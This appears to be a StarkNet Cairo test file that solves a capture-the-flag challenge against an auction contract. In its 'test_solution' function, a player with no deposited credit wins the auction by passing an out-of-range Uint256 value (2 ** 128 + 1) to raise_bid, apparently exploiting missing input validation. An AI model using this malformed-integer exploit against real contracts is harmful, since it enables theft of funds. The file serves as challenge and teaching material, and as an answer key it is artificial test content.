%lang starknet

from starkware.cairo.common.cairo_builtins import HashBuiltin
from starkware.cairo.common.uint256 import Uint256, uint256_neg, uint256_le, uint256_lt
from starkware.cairo.common.math_cmp import is_nn, is_le
from starkware.starknet.common.syscalls import get_contract_address

from auction.contracts.openzeppelin.token.erc20.interfaces.IERC20 import IERC20

const ERC20_NAME = 'Test Token'
const ERC20_SYMBOL = 'TTK'

@contract_interface
namespace IAuction:
    func auctionBalanceOf(auction_id : felt, account : felt) -> (balance : Uint256):
    end

    func start_auction():
    end

    func increase_credit(amount : Uint256):
    end

    func raise_bid(auction_id : felt, amount : Uint256):
    end

    func unlock_funds(auction_id : felt, amount : Uint256):
    end

    func current_winner(auction_id : felt) -> (current_winner : felt):
    end
end

@view
func __setup__{syscall_ptr : felt*, pedersen_ptr : HashBuiltin*, range_check_ptr}():
    alloc_locals
    let owner = 123456789
    let bidder_1 = 123
    let bidder_2 = 456
    let player = 1111

    local erc20
    local auction
    %{
        context.erc20 = deploy_contract("./auction/contracts/openzeppelin/token/erc20/ERC20.cairo", 
            [
                ids.ERC20_NAME, ids.ERC20_SYMBOL, 6, 1000000000000, 0, ids.owner
            ]
        ).contract_address
        context.auction = deploy_contract("./auction/contracts/auction.cairo", [context.erc20, ids.owner]).contract_address
        ids.erc20 = context.erc20
        ids.auction = context.auction
    %}

    %{
        stop_prank_callable_erc20 = start_prank(ids.owner, ids.erc20)
        stop_prank_callable_auction = start_prank(ids.owner, ids.auction)
    %}
    IERC20.transfer(erc20, bidder_1, Uint256(100000000000, 0))
    IERC20.transfer(erc20, bidder_2, Uint256(100000000000, 0))
    IERC20.transfer(erc20, player, Uint256(50000000000, 0))
    IAuction.start_auction(auction)
    %{
        stop_prank_callable_erc20()
        stop_prank_callable_auction()
    %}

    %{ stop_prank_callable_erc20 = start_prank(ids.bidder_1, ids.erc20) %}
    IERC20.approve(erc20, auction, Uint256(100000000000, 0))
    %{
        stop_prank_callable_erc20()
        stop_prank_callable_auction = start_prank(ids.bidder_1, ids.auction)
    %}
    IAuction.increase_credit(auction, Uint256(100000000000, 0))
    IAuction.raise_bid(auction, 1, Uint256(100000000000, 0))
    %{ stop_prank_callable_auction() %}

    %{ stop_prank_callable_erc20 = start_prank(ids.bidder_2, ids.erc20) %}
    IERC20.approve(erc20, auction, Uint256(100000000000, 0))
    %{
        stop_prank_callable_erc20()
        stop_prank_callable_auction = start_prank(ids.bidder_2, ids.auction)
    %}
    IAuction.increase_credit(auction, Uint256(100000000000, 0))
    IAuction.raise_bid(auction, 1, Uint256(100000000000, 0))
    %{ stop_prank_callable_auction() %}
    return ()
end

@view
func test_solution{syscall_ptr : felt*, pedersen_ptr : HashBuiltin*, range_check_ptr}():
    alloc_locals
    local erc20
    local auction
    %{
        ids.erc20 = context.erc20
        ids.auction = context.auction
    %}
    let player = 1111

    %{ stop_prank_callable_auction = start_prank(ids.player, ids.auction) %}
    IAuction.raise_bid(auction, 1, Uint256(2 ** 128 + 1, 0))
    %{ stop_prank_callable_auction() %}

    is_solved(auction, player)
    return ()
end

func is_solved{syscall_ptr : felt*, pedersen_ptr : HashBuiltin*, range_check_ptr}(
    auction : felt, player : felt
):
    let (current_winner) = IAuction.current_winner(auction, 1)
    assert player = current_winner
    return ()
end
